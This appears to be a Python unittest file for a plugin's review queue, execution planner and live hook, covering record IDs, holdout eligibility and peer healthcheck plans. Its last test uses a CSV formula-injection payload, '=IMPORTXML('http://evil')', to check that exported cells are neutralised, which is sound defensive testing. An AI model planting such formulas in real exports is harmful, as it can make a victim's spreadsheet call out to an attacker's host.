import csv
import hashlib
import importlib.util
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path

SKILL_DIR = Path(__file__).resolve().parents[1]
PLUGIN_DIR = SKILL_DIR / "plugin"


def load_module(name, path):
    spec = importlib.util.spec_from_file_location(name, str(path))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


execution_plan = load_module("execution_plan", PLUGIN_DIR / "execution_plan.py")
review_queue = load_module("review_queue", PLUGIN_DIR / "review_queue.py")


def minimal_registry():
    return {"registry_version": "1.0", "capabilities": [{
        "retrieval_metadata": {
            "capability_id": "hmp-healthcheck", "version": "1.0.0",
            "name": "HMP healthcheck", "description": "Check HMP health for peers",
            "examples": ["check HMP health for peer128"],
            "supports_text": ["hmp", "health", "check", "peer128", "peer70", "peer106"],
        },
        "invocation_contract": {
            "effect_class": "read_only", "trust_state": "trusted",
            "required_permissions": [], "availability_constraints": [],
        },
    }]}


class V246ReviewRemediationTests(unittest.TestCase):
    def organic_event(self, **overrides):
        data = {
            "event_id": "evt-inner-should-not-win",
            "session_id": "sess", "turn_id": "turn", "task_id": "task",
            "trace_id": "trace-v2418-caseA",
            "traffic_type": "organic_peer",
            "provenance": {"stream": "organic_live", "valid": True, "source": "hook_context.provenance"},
            "requester": {
                "actor_type": "agent", "actor_id": "hmp:peer106", "request_channel": "hmp",
                "requester_peer_id": "peer106", "processing_peer_id": "peer70",
            },
            "requester_peer_id": "peer106",
            "producer_surface": "hmp_ingress",
            "validated_inputs": {"peer_list": ["peer128"], "timeout_seconds": 5},
            "candidates": [
                {"capability": "hmp-healthcheck@1.0.0", "score": 0.91, "effect_class": "read_only", "eligible_for_intervention": False, "ineligibility_reasons": ["permissions_unknown", "availability_unknown"]},
                {"capability": "peer-heartbeat@1.0.0", "score": 0.4, "effect_class": "read_only"},
            ],
            "top_score": 0.91,
            "deployment_id": "dep-v2418-peer58-peer106",
            "deployment_timestamp": "2026-08-16T10:08:44Z",
            "timestamp": "2026-08-16T11:00:00Z",
            "plugin_version": "2.6.0",
            "plugin_artifact_hash": "abc123",
            "cohort_label": "v2.5.0_live",
            "peer_id": "peer70",
        }
        data.update(overrides)
        return {"event_id": "evt-outer-authoritative", "event_type": "retrieval_event", "schema_version": "1.3", "timestamp": "2026-08-16T11:00:00Z", "data": data}

    def test_authoritative_retrieval_id_uses_outer_event_id(self):
        rec = review_queue.build_review_record(self.organic_event(), candidate_rank=1)
        expected = hashlib.sha256("evt-outer-authoritative|hmp-healthcheck|1.0.0|1".encode()).hexdigest()[:32]
        self.assertEqual(rec["review_id"], "review_" + expected)
        self.assertEqual(rec["request"]["raw_request_ref"], "event:evt-outer-authoritative")

    def test_formal_holdout_requires_complete_valid_live_cohort(self):
        bad = self.organic_event(provenance={"stream": "unknown", "valid": False, "source": "hook_context.provenance", "reason": "invalid_provenance"})
        rec = review_queue.build_review_record(bad)
        self.assertFalse(rec["formal_holdout_eligible"])
        self.assertIn("invalid_provenance", rec["formal_holdout_rejection_reasons"])
        good = review_queue.build_review_record(self.organic_event())
        self.assertTrue(good["formal_holdout_eligible"])
        self.assertEqual(good["formal_holdout_rejection_reasons"], [])

    def test_candidate_evidence_fills_margin_and_rejection_reasons(self):
        rec = review_queue.build_review_record(self.organic_event())
        self.assertAlmostEqual(float(rec["retrieval"]["score_margin"]), 0.51, places=2)
        self.assertEqual(rec["retrieval"]["eligibility_result"], "ineligible_candidate_filter")
        self.assertEqual(rec["retrieval"]["rejection_reasons"], ["availability_unknown", "permissions_unknown"])

    def test_batch_execution_plan_represents_all_peers(self):
        plan = execution_plan.build_execution_plan("hmp-healthcheck", "1.0.0", {"peer_list": ["peer70", "peer106"], "timeout_seconds": 5})
        self.assertEqual(plan["preview_status"], "exact")
        self.assertEqual(plan["executor_kind"], "batch_http_get")
        self.assertEqual([t["target_peer_id"] for t in plan["targets"]], ["peer70", "peer106"])
        self.assertIn("192.168.178.70", plan["command_preview"])
        self.assertIn("192.168.178.106", plan["command_preview"])

    def test_live_plugin_hook_propagates_reviewer_metadata(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            regdir = root / "registry"; regdir.mkdir()
            (regdir / "registry.json").write_text(json.dumps(minimal_registry()), encoding="utf-8")
            eventdir = root / "events"; eventdir.mkdir()
            sys.path.insert(0, str(SKILL_DIR))
            try:
                import plugin as cap_plugin
                from plugin import registry as reg, event_store as events
                reg.REGISTRY_DIR = regdir; reg.REGISTRY_PATH = regdir / "registry.json"; reg._registry_cache = None
                events.EVENT_DIR = eventdir; events.EVENT_LOG = eventdir / "events.jsonl"
                old_mode = os.environ.get("CAPABILITY_REUSE_MODE")
                os.environ["CAPABILITY_REUSE_MODE"] = "shadow"
                cap_plugin.on_pre_llm_call(
                    session_id="sess-live",
                    user_message="check HMP health for peer128 and peer106",
                    episode_id="ep", turn_id="turn", task_id="task",
                    provenance={"stream": "organic_live", "source": "hook_context.provenance", "valid": True},
                    request_channel="hmp", requester_peer_id="peer106", processing_peer_id="peer70",
                    traffic_type="organic_peer",
                )
                if old_mode is None: os.environ.pop("CAPABILITY_REUSE_MODE", None)
                else: os.environ["CAPABILITY_REUSE_MODE"] = old_mode
            finally:
                try: sys.path.remove(str(SKILL_DIR))
                except ValueError: pass
            rows = [json.loads(x) for x in (eventdir / "events.jsonl").read_text().splitlines()]
            ev = rows[-1]; data = ev["data"]
            self.assertEqual(data["retrieval_event_id"], ev["event_id"])
            self.assertEqual(data["requester"]["request_channel"], "hmp")
            self.assertEqual(data["requester"]["requester_peer_id"], "peer106")
            self.assertEqual(data["requester"]["processing_peer_id"], "peer70")
            self.assertEqual(data["traffic_type"], "organic_peer")
            self.assertEqual(data["validated_inputs"]["peer_list"], ["peer128", "peer106"])

    def test_label_reason_semantics_and_csv_whitespace_neutralization(self):
        with tempfile.TemporaryDirectory() as td:
            labels = Path(td) / "human-labels.jsonl"
            with self.assertRaises(ValueError):
                review_queue.append_human_label(labels, "review_1", "ACCEPT", "wrong_target", "bad", "raw:123")
            row = review_queue.append_human_label(labels, "review_1", "ACCEPT", "exact_match", "ok", "telegram:123456789")
            self.assertNotIn("123456789", row["reviewer"])
        record = review_queue.build_review_record(self.organic_event(redacted_text="  =IMPORTXML('http://evil')"))
        out = Path(tempfile.mkdtemp()) / "queue.csv"
        review_queue.write_review_csv(out, [record])
        csv_row = next(csv.DictReader(out.open()))
        self.assertTrue(csv_row["redacted_text"].startswith("'  ="))


if __name__ == "__main__":
    unittest.main()
